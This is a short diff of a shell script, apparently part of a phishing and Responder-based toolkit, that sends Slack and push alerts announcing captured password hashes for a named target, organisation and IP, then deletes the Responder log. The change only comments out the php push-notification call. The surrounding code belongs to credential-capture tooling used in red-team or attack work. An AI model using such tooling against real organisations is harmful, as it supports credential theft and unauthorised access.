@@ -40,7 +40,7 @@ then
   link=$(echo "$APIURL/phishingdocs/results?UUID=$UUID");
   messagepush=$(echo "*HIT!!* Captured a" $HashType "hash ("$Module") for" $Target "at" $Org "("$IP")");
   curl -s -X POST --data-urlencode 'payload={"channel": "'$Channel'", "username": "HashBot", "text": "'$message'", "icon_emoji": ":hash:"}' $Token
-  php /var/www/html/config/push.php "$messagepush" "HashBot" "./hash.png" "$link" "HashBot";
+  ##php /var/www/html/config/push.php -- "$messagepush" "HashBot" "./hash.png" "$link" "HashBot";
   rm /var/log/Responder/$file;
 fi
 
@@ -50,7 +50,7 @@ then
   link=$(echo "$APIURL/results?project=$Target");
   messagepush=$(echo "*HIT!!* Captured a" $HashType "hash ("$Module") for "$Target" at "$IP"");
   curl -s -X POST --data-urlencode 'payload={"channel": "'$SlackChannel'", "username": "HashBot", "text": "'$message'", "icon_emoji": ":hash:"}' $SlackURL
-  php /var/www/html/config/push.php "$messagepush" "HashBot" "./hash.png" "$link" "HashBot";
+  #php /var/www/html/config/push.php -- "$messagepush" "HashBot" "./hash.png" "$link" "HashBot";
   rm /var/log/Responder/$file;
 fi
 
